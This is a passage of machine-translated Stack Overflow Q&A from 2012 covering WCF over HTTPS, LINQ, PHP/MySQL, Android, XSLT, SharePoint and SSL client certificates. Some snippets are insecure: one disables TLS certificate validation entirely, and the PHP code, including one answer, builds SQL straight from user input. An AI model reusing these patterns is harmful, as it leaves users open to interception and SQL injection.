# wcf - Monotouch中通过HTTPS的WCF？

> ID：10246335
> 
> 赞同：2
> 
> 时间：2012-04-20T12:33:30.570
> 
> 标签：wcf, https, xamarin.ios

我正在尝试通过 https 调用 wcf 服务，并遵循[此处](http://docs.xamarin.com/ios/tutorials/Working_with_Web_Services#Consuming_WCF_Services)建议的设置。它在 http 上运行良好，但我在 https 上收到 RemoteCertificateNameMismatch 错误，我正在处理这个错误（如建议的那样） -

```
System.Net.ServicePointManager.ServerCertificateValidationCallback +=
          (se, cert, chain, sslerror) => { return true; }; 
```

后来我得到一个 415 不支持的媒体类型错误，我无法弄清楚。我有一个能够调用服务并接收结果的 win .net 测试客户端，但是从 monotouch 我无法让它工作。有没有人能够成功地做到这一点并且不介意粘贴一个例子？

任何帮助深表感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:47:34.300

HTTP 错误代码来自服务器端。当然，客户端配置可能会在其中发挥作用。

如果可能，切换到 HTTP 并比较`wireshark`Windows 和 MonoTouch 客户端之间的会话（例如使用 ）。在 HTTPS 中这样做可能会告诉您*一些*事情，但这不太可能有帮助。

还要检查影响其他（非 MonoTouch）项目的类似错误[。](http://blogs.msdn.com/b/endpoint/archive/2010/11/01/wcf-webhttp-service-returns-http-415-unsupported-media-type.aspx) `415`由于错误来自服务器，因此他们提供的信息可能会帮助您找到正在发生的事情。

# java - 如何识别此 Java 框架中使用的密码学？

> ID：10246336
> 
> 赞同：-1
> 
> 时间：2012-04-20T12:33:34.093
> 
> 标签：java, cryptography

如[如何从使用 C# 代码渲染到网页的 JVM 中检索数据？](https://stackoverflow.com/questions/10212757/how-do-i-retrieve-data-from-a-jvm-renderized-into-a-web-page-using-c-sharp-code)，我正在尝试编写一个 C# Bot 来模拟该网站中的查询。

现在的问题是在返回信息的网络请求时使用的“密码学”。

他们的密码学源代码可以在这里找到：http: [//pastebin.com/fdJZvXDG](http://pastebin.com/fdJZvXDG)

问题是，由于代码没有注释，有什么办法可以：

1.  弄清楚`ai`用于构造类的参数是什么
2.  找到他们用于加密/解密请求返回的信息的密钥？

任何帮助在这里表示赞赏，我读过这`DES`是Java中的一种加密模式，但我以前从未见过它。这个类是否实现了这种模式，只有类名和模式是一样的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T12:40:15.767

它是[DES 密码](http://en.wikipedia.org/wiki/Data_Encryption_Standard)的一种实现。Java 有一个内置的类，允许您使用 DES 加密和解密数据。[这个网站](http://www.exampledepot.com/egs/javax.crypto/desstring.html)展示了如何使用这个类。

它不是一种模式，而是一种开放和标准化的密码。

您提到您想弄清楚他们正在使用的密钥，并且根据您提供的信息，这根本是不可能的。

该`ai`参数看起来像是在密钥扩展中使用并指定密码的初始密钥（字符串）。这似乎是一个实施不佳的版本，并且可能不正确；我不希望 Java 类能够处理这种密码变体。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T12:43:22.430

基于 56 位的密码，您可以在大约 4 小时内在家用计算机上破解它。根据[DES WIKI](https://en.wikipedia.org/wiki/Data_Encryption_Standard) ， “DES 现在被认为对许多应用程序不安全。这主要是由于 56 位密钥太小；1999 年 1 月，distributed.net 和电子前沿基金会合作公开破解了 DES输入 22 小时 15 分钟”

你最好的选择是暴力破解密钥。

# c# - 无法安装已发布的 .NET C# 程序

> ID：10246348
> 
> 赞同：0
> 
> 时间：2012-04-20T12:34:52.707
> 
> 标签：c#, .net, visual-studio, publish

我目前正在努力解决在 Visual Studio 2010 中发布使用 C# 编写的应用程序后遇到的问题。该应用程序在调试模式下运行时没有错误或警告。在我的应用程序中，我使用了 6 个不同的第 3 方 .DLL:s、[http](http://pcapdotnet.codeplex.com/) : //pcapdotnet.codeplex.com/ 和 vcinet2.dll。

该应用程序可以安装在我自己的计算机上，并且可以在此处正常运行，但是当我尝试将其安装在另一台计算机上时，它不起作用。这就是发生的情况：应用程序（通过发布工具 I VS 2010 发布后）可在指定文件夹中访问。我运行 setup.exe 文件并开始安装。它完成安装，但在此之后（在桌面上创建快捷方式并且应用程序开始加载之后）应用程序崩溃。它说“MyProgram 已停止工作，请在线查看？关闭程序？调试程序？” 当我单击更多详细信息时，将显示：

```
“Problem signature:
  Problem Event Name:   APPCRASH
  Application Name: MyProgram.exe
  Application Version:  1.0.0.0
  Application Timestamp:    4f9150a6
  Fault Module Name:    KERNELBASE.dll
  Fault Module Version: 6.1.7601.17651
  Fault Module Timestamp:   4e2111c0
  Exception Code:   e0434352
  Exception Offset: 0000d36f
  OS Version:   6.1.7601.2.1.0.256.4
  Locale ID:    1053
  Additional Information 1: 0a9e
  Additional Information 2: 0a9e372d3b4ad19135b953a78882e789
  Additional Information 3: 0a9e
  Additional Information 4: 0a9e372d3b4ad19135b953a78882e789
Read our privacy statement online:
  http://go.microsoft.com/fwlink/?linkid=104288&clcid=0x0409
If the online privacy statement is not available, please read our privacy statement offline:
  C:\Windows\system32\en-US\erofflps.txt “ 
```

我在浏览 Internet 后发现，人们在使用远程服务器进行发布或从网页更新时会遇到此问题。但我没有，我只是在 VS 2010 的“用户将如何安装应用程序”窗口中使用“从 CD-ROM 或 DVD-ROM”。

我已经使用这个几天了，主要是检查与 .DLL:s 等的兼容性。但我还没有找到解决方案。

两台计算机都使用 x86 平台，我在 VS2010 中的“平台目标”是“x86”。

当我仔细查看“e0434352”（错误代码）时，我发现这是我 VS2010 的每个异常的某种错误，这是正确的还是我误解了这个？

我真的很感激我能得到的任何帮助，我觉得这是一个简单的解决方案，在 VS2010 中有一些设置是错误的，但我无法弄清楚！

在程序开始的时候我没有得到任何异常，这让我认为这是一个错误的设置？

最好的问候埃里克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:50:36.557

您是否检查了项目中的应用程序文件 -> 发布属性？我已经看到 VS 没有在应用程序文件中自动添加我想要的库。这应该确保它们被安装。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-06-17T11:01:42.077

就我而言，当我使用的框架库少于用于编译项目的框架时，就会发生此错误。

您在窗口窗体中使用的一些对象来自网络框架 2 的库，例如 Microsoft.VisualBasics.PowerPacks.Vs 在框架 4 中没有类似的对象。

如何解决问题？

转到项目扩展参考检查框架的属性，通常列表的倒数第二个是这个版本小于框架用于编译相同属性列表中的“本地副本”更改为 true 重新编译并且应用程序工作

# .net - 如何计算符合和不符合条件的记录数量

> ID：10246352
> 
> 赞同：2
> 
> 时间：2012-04-20T12:35:03.663
> 
> 标签：.net, sql, linq-to-sql

我想计算拥有所有者 (OwnerId!=0) 和没有所有者 (OwnerId==0) 的团队数量。

在普通的 SQL 中，我会使用一个查询来做到这一点，只使用 2 个子查询：

```
select
    (SELECT COUNT(*) FROM teams WHERE User=0) AS FreeTeams,
    (SELECT COUNT(*) FROM teams WHERE User!=0) AS UsedTeams 
```

他们有更简单的方法吗？如何将其翻译成 Linq2Sql？

谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T12:48:52.667

```
var sums =
 (from t in teams
 group t by 0 into g
 select new { freeTeams = g.Count(p => p.User == 0), usedTeams = g.Count(p => p.User != 0) }).SingleOrDefault(); 
```

这将只发出一个查询，但它需要两次表扫描，因为 L2S 无法有效地转换它。

我们可以将其归结为一次表扫描：

```
var sums =
 (from t in teams
 group t by (t.User != 0) into g
 select new { isUsedTeam = g.Key, Count = g.Count() }).ToList(); 
```

这将为您提供两行，一排用于 freeTeams，另一排用于 usedTeams。**讨厌，但 LINQ2SQL 可用的最快方法。**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T12:38:56.260

`teams`假设您的对象设置正确，您可以像这样在 Linq to SQL 中执行此操作：

```
var freeTeams = teams.Count(p => p.User == 0);
var usedTeams = teams.Count(p => p.User != 0); 
```

如果你真的想对数据库进行一次点击，并且愿意牺牲一些可读性，你可以使用这样的东西：

```
var counts = from a in teams
    group a by true into aa
    select new
    {
        freeTeams = aa.Count(p => p.User == 0),
        usedTeams = aa.Count(p => p.User != 0)
    }; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-20T12:41:21.510

在普通 SQL 中，更简单的方法是使用`CASE`语句：

```
SELECT SUM(CASE WHEN [User]=0 THEN 1 ELSE 0 END) AS FreeTeams,
       SUM(CASE WHEN [User]<>0 THEN 1 ELSE 0 END) AS UsedTeams
FROM Teams 
```

# objective-c - Segue 必须等待 dispatch_queue 完成

> ID：10246357
> 
> 赞同：0
> 
> 时间：2012-04-20T12:35:15.877
> 
> 标签：objective-c, ios5, grand-central-dispatch, segue

我有一个小问题。

我有一个带有按钮的详细视图。当用户单击此按钮时，会发生一些事情（解析 xml，下载文件，...）。这发生在 dispatch_queue 上。

此外，当单击按钮时。详细视图转为表格视图。表格视图显示了 NSDocumentDirectory 中的文件。

问题：我的 segue 在队列中的任务完成之前进入 tableview。这会导致我的表格视图中的文件列表不是最新的。

所以我想要的是我的 segue 等到队列完成工作并在队列处理我的详细信息视图时显示活动指示器。当队列完成后，segue 可以继续到 tableviewcontroller。

谁能帮我？

那将是真棒。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:47:24.710

可能最简单的方法是不使用“自动”转场。也就是说，将 segue 从视图链接到新的视图控制器，而不是直接从按钮链接。

按下按钮时，您将启动后台任务并显示“处理”HUD。

完成后，您将移除 HUD 并“手动”执行 segue。

# c# - 使用 Linq to XML 从 xml 文档的值字段返回子字符串

> ID：10246363
> 
> 赞同：0
> 
> 时间：2012-04-20T12:35:41.680
> 
> 标签：c#, xml, linq, linq-to-xml

XML 字段是这样的：

```
<Element> 0 (0)</Element> 
```

据我所知，这应该按照我的意愿进行，您可以忽略不相关的部分（e.Descendants），因为在我的查询的更大方案中这是正确的（并且我已经验证了这一点）。：

```
Regex regularExpression = new Regex(@"(\d+) \((\d+)\)", RegexOptions.IgnorePatternWhitespace); 
```

还有有问题的 Linq to XML：

```
variableName =  e.Descendants().Where(i => regularExpression.IsMatch(i.Value.ToString())).Select(j => regularExpression.Match(j.Value.ToString()).Groups[1].Value.ToString()).ToList() 
```

但是，当我尝试打印此值时，它没有打印任何内容。

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:40:28.100

您的正则表达式应该使用`'\s'`而不是`' '`：

```
Regex regEx2 = new Regex(@"(\d+)\s\((\d+)\)", RegexOptions.IgnorePatternWhitespace); 
```

# json - JSON POST 不工作 Windows Phone 7

> ID：10246364
> 
> 赞同：0
> 
> 时间：2012-04-20T12:35:42.903
> 
> 标签：json, silverlight, windows-phone-7, post

我认为这不起作用，我想知道您是否可以发现我的代码有任何问题以及如何解决？我对此非常陌生，不确定是否使用 Web 请求、Web 响应或其他任何东西。对 json 进行 POST 的最基本方法是什么？

谢谢

```
private void btnSaveCar_Click(object sender, RoutedEventArgs e)
        {
            string url = "http://......";
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.BeginGetRequestStream(new AsyncCallback(ProcessResponse), request);
        }

    private void ProcessResponse(IAsyncResult asyncResult)
    {
        HttpWebRequest request = (HttpWebRequest)asyncResult.AsyncState;
        Stream streamResp = request.EndGetRequestStream(asyncResult);
        DataContractJsonSerializer ser = new DataContractJsonSerializer(typeof(Car));
        Car newCar = new Car():

        Deployment.Current.Dispatcher.BeginInvoke(() =>
        {

            newCar.Condition = txtCondition.Text;
            newCar.Colour = txtColour.Text;
            newCar.RegistrationNumber = txtReg.Text;
            newCar.Model = txtModel.Text;
            short.TryParse(txtYear.Text, out newCar.Year);
            short chassisNumber;
            short.TryParse(txtChassisNumber.Text, out chassisNumber);
            newCar.ChassisNumber = chassisNumber;
            newCar.BodyStyle = txtBodyStyle.Text;
            try
            {
                ser.WriteObject(streamResp, newCar);
                NavigationService.GoBack();
            }
            catch
            {
                MessageBox.Show("didnt work :(");
            }

        });
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:21:48.310

您的代码不完整，您应该在将数据写入请求流后调用[Request.BeginGetResponse()方法！](http://msdn.microsoft.com/en-us/library/system.net.webrequest.begingetresponse%28v=vs.95%29.aspx)

查看[此示例代码](http://msdn.microsoft.com/en-us/library/debx8sh9.aspx)，了解如何使用 WebRequest 进行 POST（请注意该示例适用于 .NET 4.0，但我想您会明白的）。

我仍然建议您使用[RestSharp](http://restsharp.org/)而不是使用基本的 WebRequest 来节省一些开发时间！

# php - 在执行基本 SELECT 时，您的 SQL 语法有错误

> ID：10246365
> 
> 赞同：0
> 
> 时间：2012-04-20T12:35:47.827
> 
> 标签：php, mysql, mysql-error-1064

我正在尝试在 MySQL 数据库中搜索用户特定的网站活动，为此我创建了一个表单和流程来搜索统计表并返回每个记录与查询匹配的用户 ID。但是我不断收到此消息，不知道为什么：

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL     server version for the right syntax to use near '@hotmail.com' at line 1 
```

这是我正在使用的表格

```
<form method='get' action='searchuser.php'  id='searchuser'>
<input type='text' input name='txtSearch' id='txtSearch'>
    <input type='submit' name='submit' value='Search'>
</form>"; 
```

这是进程文件

```
<?php
require_once( "Functions.php" );
$header = makeHeader();

$con= connect();

$user = $_GET['txtSearch'];

$query = "SELECT * FROM statistics WHERE userID = $user";
$result=mysql_query($query) or die (mysql_error());

echo"<table border='1'><th>User</th><th>IP</th>
    <th>Date</th><th>Page visited</th><th>Page from</th>";

while($row = mysql_fetch_assoc($result))
{
$username = $row['userID'];
$ip =  $row['ipAddress'];
$date = $row['dateOfVisit'];
$pagev = $row['pageVisited'];
$pagef = $row['pageFrom'];

echo "<tr><td>".$row->UserID."</td><td>".$row->ipAddress."</td><td>".$row->dateOfVisit."</td><td>".
    $row->pageVisited."</td><td>".$row->pageFrom . "<br/>\n"."</td></tr>";
    }
IF (mysql_num_rows($queryresult) == "") 
            {
                Echo "<p>Sorry there were no results for your         search<p> <br /><br /> <p><A HREF='javascript:javascript:history.go(-1)'>Click here to go back to previous page</A></p>";
            } 

$footer = makeFooter();

?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T12:38:00.910

SQL问题出在

> `userID = $user`

将字符串放入sql查询的正确方法是

*   用引号分隔它
*   并使用 mysql_real_escape_string 来转义内部可能发生的分隔符。

所以。正确的代码是

```
 $user =  mysql_real_escape_string($user);
  $query = "SELECT * FROM statistics WHERE userID = '$user'"; 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-04-20T12:52:49.917

试试这个

```
$user = $_GET['txtSearch'];
$query = "SELECT * FROM statistics WHERE userID = ".$user." "; 
```

这对我有用

# android - 在android中的TextView内自动链接

> ID：10246366
> 
> 赞同：20
> 
> 时间：2012-04-20T12:35:53.857
> 
> 标签：android, textview, autolink

如何为 textview 的某些部分提供自动链接？例如：我在 TextView 中的文字是“请点击此处打开此网页”。我只想显示“此处”文本的链接。我应该在单击“此处”文本时打开该网页，而不是在 TextView 的任何位置。

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-04-20T12:44:03.790

在 string.xml 中放入一个字符串

```
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="txtCredits">Support: <a href="http://www.stackoverflow.com">click here</a></string>
</resources> 
```

您可以像这样在 textView 中使用它：

```
<TextView
        android:layout_width="fill_parent"
        android:id="@+id/text"
        android:layout_height="wrap_content"
        android:gravity="center"
        android:linksClickable="true"
        android:text="@string/txtCredits" /> 
```

**编辑**

由于某种原因，上面的代码无法正常工作。所以，也添加下面的代码，

```
TextView t2 = (TextView) findViewById(R.id.text);
t2.setMovementMethod(LinkMovementMethod.getInstance()); 
```

**重要提示**`autoLink="web"`：如果您正在调用，请不要忘记删除`setMovementMethod()`。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-20T12:41:34.040

Textviews 能够显示 HTML，这可以解决您的问题。将您想要可点击的内容包装在超链接中：

```
String html = "My link is <a href=\"http://google.com\">here</a>";
myTextView.setText(Html.fromHtml(html)); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-21T13:05:52.623

在 strings.xml 中使用简单的 Url：

```
<string name="autolink_val">Please Click Here : http://www.google.com</string> 
```

在 Java 代码中这样写：

```
<TextView android:id="@+id/linkVal"   
          android:layout_width="wrap_content" 
          android:layout_height="wrap_content" 
          android:autoLink="web" 
          android:text="@string/autolink_val1"/>` 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-20T12:45:46.267

在 strings.xml 中使用 HTML 语法：

```
<string name="test">Click &lt;a href="http://vtuhtan.info"&gt;here&lt;/a&gt;</string> 
```

将 TextView 属性设置为具有可点击链接和自动链接。

```
TextView tv = findViewById(R.id.textView);
tv.setText(Html.fromHtml(getResources().getString(R.string.test))); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-11-25T08:58:50.623

您可以使用以下代码对其进行测试：

```
 <TextView
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="http://www.yahoo.com"
    android:autoLink="web"
    /> 
```

# wordpress - Wordpress - 检查将来是否有要发布的帖子

> ID：10246370
> 
> 赞同：1
> 
> 时间：2012-04-20T12:35:56.730
> 
> 标签：wordpress

我需要检查将来是否有要发布的帖子。我想使用 WP 功能，不能通过 mysql_query 直接访问数据库。

有人有一些代码示例吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:57:27.473

```
$count_posts = wp_count_posts();
$future_posts = $count_posts->future;
if($future_posts > 0)
{
    // future posts available
} 
```

或者

```
if(wp_count_posts()->future > 0)
{
    // future posts available
} 
```

`wp_count_posts()`返回

```
stdClass Object 
( 
    [Publish] => 60 
    [Future] => 1 // only one is available 
    [Draft] => 9 
    [Pending] => 3 
    [Private] => 0 
    [Trash] => 0 
    [Auto-draft] => 3 
    [Inherit] => 0 
) 
```

[**参考**](http://codex.wordpress.org/Function_Reference/wp_count_posts)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:42:41.303

$future_posts = get_posts('post_status' => 'future');

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T12:40:33.617

请参阅 WordPress 法典：

[http://codex.wordpress.org/Template_Tags/get_posts](http://codex.wordpress.org/Template_Tags/get_posts)

用于`post_status`填写`future`

# xml - 如何在 XSLT 中获取以下同级

> ID：10246371
> 
> 赞同：17
> 
> 时间：2012-04-20T12:35:57.547
> 
> 标签：xml, xslt, xpath

我对 XSLT 相当陌生，这是我的 XML：

```
<projects>
    <project>
        <number>1</number>
        <title>Project X</title>
    </project>
    <project>
        <number>2</number>
        <title>Project Y</title>
    </project>
    <project>
        <number>3</number>
        <title>Project Z</title>
    </project>
</projects> 
```

如果我有一个项目并且想要获得跟随它的兄弟姐妹，我该怎么做？

这段代码似乎对我不起作用：

```
/projects[title="Project X"]/following-sibling 
```

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-04-20T12:40:46.947

这实际上是一个完全 XPath 的问题。

**使用**：

```
/*/project[title = 'Project X']/following-sibling::project[1] 
```

`Project`这将选择作为 XML 文档中顶部元素的子元素的任何元素的任何第一个后续兄弟`Project`元素，并且其至少一个子元素的字符串值`title`是 string `"Project X"`。

**基于 XSLT 的验证：**

```
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="/">
     <xsl:copy-of select=
      "/*/project[title = 'Project X']/following-sibling::project[1]"/>
 </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于提供的 XML 文档时：**

```
<projects>
    <project>
        <number>1</number>
        <title>Project X</title>
    </project>
    <project>
        <number>2</number>
        <title>Project Y</title>
    </project>
    <project>
        <number>3</number>
        <title>Project Z</title>
    </project>
</projects> 
```

**计算 XPath 表达式并将正确选择的元素复制到输出：**

```
<project>
   <number>2</number>
   <title>Project Y</title>
</project> 
```

# asp.net-mvc - asp.net mvc 中的常驻对象

> ID：10246372
> 
> 赞同：0
> 
> 时间：2012-04-20T12:35:57.800
> 
> 标签：asp.net-mvc

我注意到每次在 ASP.NET MVC 中调用 Controller 类中的方法时都会创建 Controller 对象。所以我的任何对象仅在 1 个请求期间存在。但其他请求将创建另一个对象。所以我需要创建在网站运行期间将存在的对象（类似于守护进程）。是否可以在没有外部服务的情况下在一个网站上做这样的事情？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:01:25.570

您可以通过不同的方式实施。

1.  使用应用程序对象。

2.  将对象放入缓存中。

3.  使用单例方法。

我个人建议最后一种方法。

# facebook - 为什么移动网络应用程序上的 Facebook 请求不起作用？

> ID：10246374
> 
> 赞同：3
> 
> 时间：2012-04-20T12:36:01.380
> 
> 标签：facebook

我已经阅读了关于 FB 请求如何仅适用于 Canvas 应用程序的其他线程，但也许这些答案有点陈旧，我想确保这是当前信息，因为在这个页面上[http://developers.facebook.com/文档/频道/](http://developers.facebook.com/docs/channels/) FB 说：

如果您已经构建了 Canvas 或**Mobile Web 应用程序**，请求是使用户能够邀请他们的朋友的好方法。

Canvas 与移动设备之间的区别：[Facebook 画布应用程序与 Facebook 移动网络应用程序](https://stackoverflow.com/questions/8753179/facebook-canvas-app-vs-facebook-mobile-web-app)

那么，即使他们这么说，请求也只是对 Canvas 的请求吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T14:28:31.987

回答我自己的问题：

您需要应用设置中的画布 url 才能访问请求。这些请求可以在您的移动网络应用程序（不仅仅是画布）上完成。

如果您只想要一个移动应用程序而不是画布应用程序但仍使用请求，请在应用程序面板上填写画布 url，并在此 url 的页面上使用 javascript 重定向到您的移动应用程序。

# c# - Sharepoint 2010 应用程序页面上的 CurrentUser 为空

> ID：10246378
> 
> 赞同：1
> 
> 时间：2012-04-20T12:36:23.497
> 
> 标签：c#, sharepoint-2010, spcontext

我有应用程序页面，托管在 Sharepoint 服务器上（例如[http://myportal/mysite/_layouts/application/default.aspx](http://myportal/mysite/_layouts/application/default.aspx)），其代码如下：

```
protected void Page_PreLoad(object sender, EventArgs e)
{           
    var userEmail = SPContext.Current.Web.CurrentUser.Email;
} 
```

如果用户在浏览器启动后尝试直接通过 URL 获取该页面，则会出现异常，因为 CurrentUser 为空。但是，如果用户首先导航到网站（http://myportal/mysite），然后导航到应用程序页面，则 CurrentUser 不为空。那么，如果 CurrentUser 对象没有在 SPContext 中初始化，我该如何获取它呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:16:00.340

从 RunWithElevatedPrivileges 代码中的提升 SPWeb 获取当前用户。试试这个代码。

```
SPWeb site = SPContext.Current.Web;
SPSecurity.RunWithElevatedPrivileges(delegate()
{
    using (SPSite ElevatedsiteColl = new SPSite(site.Url))
   {
       using (SPWeb ElevatedSite = ElevatedsiteColl.OpenWeb())
       {
            SPUser currUser = site.CurrentUser; //not the ElevatedSite.CurrentUser
       }
   }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-11T19:19:22.263

嗯……迟到总比没有好。我今天遇到了同样的问题。先前的评论没有解决原始发帖人表达的问题。当您在 _Layouts 文件夹中发布 .ASPX 页面时，问题就出现了，然后，当使用 Forms 或 Claims auth 时，将该自定义页面设为您在会话中的第一次点击（之前没有记住登录）。默认情况下不会触发 SharePoint 身份验证（即使您从 LayoutsPageBase 类继承）。如果您导航到其他一些 SharePoint 页面（例如 _Layouts/15/Settings.aspx）然后返回，则会填充 CurrentUser *。*我必须使用 Reflector 来更好地了解发生了什么以及如何修理它。简短的回答是，一旦你意识到 CurrentUser == null，你需要添加这行代码：

```
Microsoft.SharePoint.Utilities.SPUtility.HandleAccessDenied(new UnauthorizedAccessException()); 
```

在我的例子中，这段代码生成了一个对我用来登录的浏览器的质询/响应，并且在这行代码之后，CurrentUser 对象被正确填写。这是我的整个函数最终的样子：

```
public static bool isAdminAuthorized()
{
    Microsoft.SharePoint.SPContext oContext ;
    Microsoft.SharePoint.SPWeb oWeb ;
    Microsoft.SharePoint.SPUser oUser ;
    try
    {
        oContext = Microsoft.SharePoint.SPContext.Current;
    }
    catch { throw new Exception("Can't obtain Sharepoint Context!"); }
    try
    {
        oWeb = oContext.Web;
    }
    catch { throw new Exception("Can't obtain Sharepoint web!"); }
    try
    {
        oUser = oWeb.CurrentUser;
    }
    catch { throw new Exception("Can't obtain Sharepoint current user!"); }
    if (oUser == null)
    {
        Microsoft.SharePoint.Utilities.SPUtility.HandleAccessDenied(new UnauthorizedAccessException());
        oUser = oWeb.CurrentUser;
    }
    foreach (Microsoft.SharePoint.SPGroup oGroup in oUser.Groups)
    {
        if (oGroup.Name.ToUpper().Contains("OWNER"))
        {
            return true;
        }
    }
    return false;
} 
```

# c# - 将 Web 服务与 Silverlight 和 WPF 一起使用的区别

> ID：10246379
> 
> 赞同：0
> 
> 时间：2012-04-20T12:36:43.217
> 
> 标签：c#, wpf, silverlight, web-services

我`WebMethod`在后端 Web 服务中编写了一个简单的。我在 WPF 应用程序和 Silverlight 应用程序中都使用它作为服务引用。

该方法返回一个`List<string>`被调用的`userList`. 这在 WPF 应用程序中运行良好，我在其中将其引用`Service1SoapClient`为“客户端”。因此通过-调用该方法

```
client.userlist(); //this is the case in WPF app 
```

然而，在 Silverlight 中，唯一的选择是

```
client.userListAsync(); //Silverlight 
```

这在 WPF 中工作正常并带回所需的列表，但是 Silverlight 带回错误 -

```
Error   11  Cannot implicitly convert type 'void' to 'System.Collections.Generic.List<string>' 
```

同样与此相关的是，在 WPF 应用程序中，我正在使用 userList 附加带有richTextBox 的文本，这可以工作，但是在 Silverlight`richTextBox1.AppendText`中不是一个有效的选项。

Silverlight 应用程序哪里出错了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T12:49:23.033

Silverlight 中的所有 Web 服务调用都是异步的，这意味着您不能让应用程序在等待结果返回时阻止执行。取而代之的是，您告诉 Silverlight 在得到结果后该做什么，然后让它继续自己的业务直到那时。

您的 Silverlight 应用程序的 Web 服务客户端要求您向其传递一个事件处理程序，该处理程序将 Web 方法的返回值作为 xxxCompletedEventArgs 参数，其中“xxx”是您的 Web 方法的名称。

此页面： http: [//msdn.microsoft.com/en-us/library/cc197937](http://msdn.microsoft.com/en-us/library/cc197937(v=vs.95).aspx) (v=vs.95).aspx告诉您如何设置事件处理程序并使用它来处理 Web 服务调用的输出.

从页面：

```
 proxy.GetUserCompleted += new EventHandler<GetUserCompletedEventArgs (proxy_GetUserCompleted);
    proxy.GetUserAsync(1);
    //...
}

//...

void proxy_CountUsersCompleted(object sender, CountUsersCompletedEventArgs e)
{
    if (e.Error != null)
    {
        userCountResult.Text = “Error getting the number of users.”; 
    }
    else
    {
        userCountResult.Text = "Number of users: " + e.Result;
    }
} 
```

# windows-phone - 诺基亚 Lumia800 wifi 带锁屏

> ID：10246384
> 
> 赞同：1
> 
> 时间：2012-04-20T12:37:12.583
> 
> 标签：windows-phone, wifi

是否可以使用后台代理或提醒来保持 wifi 活跃？假设我让后台代理每分钟左右打开到服务器的连接。wifi 将在两分钟后关闭，然后您重新连接。

这可能吗？还是我完全错了？

这对所有 Windows Phone 用户来说都是一个大问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T12:43:07.093

使用后台代理是不可能的。

> 定期代理通常每**30 分钟**运行一次。为了优化电池寿命，周期性代理可能会与其他后台进程一起运行，因此执行时间可能会漂移多达 10 分钟。
> 
> 资源密集型代理通常运行**10 分钟**。还有其他限制可能导致代理提前终止

[http://msdn.microsoft.com/en-us/library/hh202942(v=vs.92).aspx](http://msdn.microsoft.com/en-us/library/hh202942(v=vs.92).aspx)

而且你不能在没有用户干预的情况下打开wifi

# android - Android 中等效的 cURL SSL 通信

> ID：10246388
> 
> 赞同：0
> 
> 时间：2012-04-20T12:37:35.400
> 
> 标签：android, ssl, curl, ssl-certificate

我正在移植一个应用程序，该应用程序在内部进行 cURL 调用以安全地连接到服务器。它在向服务器发出请求之前使用下载的证书和私钥文件。

我有一个包含 RSA 私钥的“My_Private_key.pem”文件，一个包含发送的证书服务器的“My_Certificate.pem”文件和一个用于加密“My_Private_key.pem”的密码。现在 cURL 有一个设置 SSLKey、SSLCertificate 和 Password 的选项。例子

```
curl_easy_setopt(curl, CURLOPT_SSLCERT, credentials->certfile);
curl_easy_setopt(curl, CURLOPT_SSLKEY, credentials->keyfile);
curl_easy_setopt(curl, CURLOPT_KEYPASSWD, credentials->passwd); 
```

然后 cURL 使用此信息来请求服务器。我想在 Android 中做类似的事情。我浏览了许多链接，这些链接帮助我创建了自己的使用 EasySSLSocketFactory、EasyX509TrustManager 的 HttpClient，但我找不到在 Android 中设置这些选项的方法。

在 Android 中等效的方法是什么？

我对 SSL 很陌生，所以我的问题可能有点天真，所以请多多包涵:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:57:19.073

您必须从您的密钥和证书创建一个 PKCS#12 文件，将其加载为密钥库并用它初始化 HttpClient（或 HttpsURLConnection）。对于 HttpClient，您可以使用[SSLSocketFactory](http://developer.android.com/reference/org/apache/http/conn/ssl/SSLSocketFactory.html)类使用您的密钥和证书初始化客户端。

您可以使用这样的东西来创建 PKCS#12 文件：

$ openssl pkcs12 -export -in mycert.pem -inkey mykey.key -out mystore.pfx

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T06:43:27.903

这对我来说是完美的。我从stackoverflow链接中获取它，但我现在找不到。所以发布代码

```
public void setHttpsClient(String password) {

        try {
            KeyStore mycert = KeyStore.getInstance("pkcs12");

            byte[] pkcs12;

            //Load the PKCS file from database or file.
            pkcs12 = DataManager.getAuthP12Data();
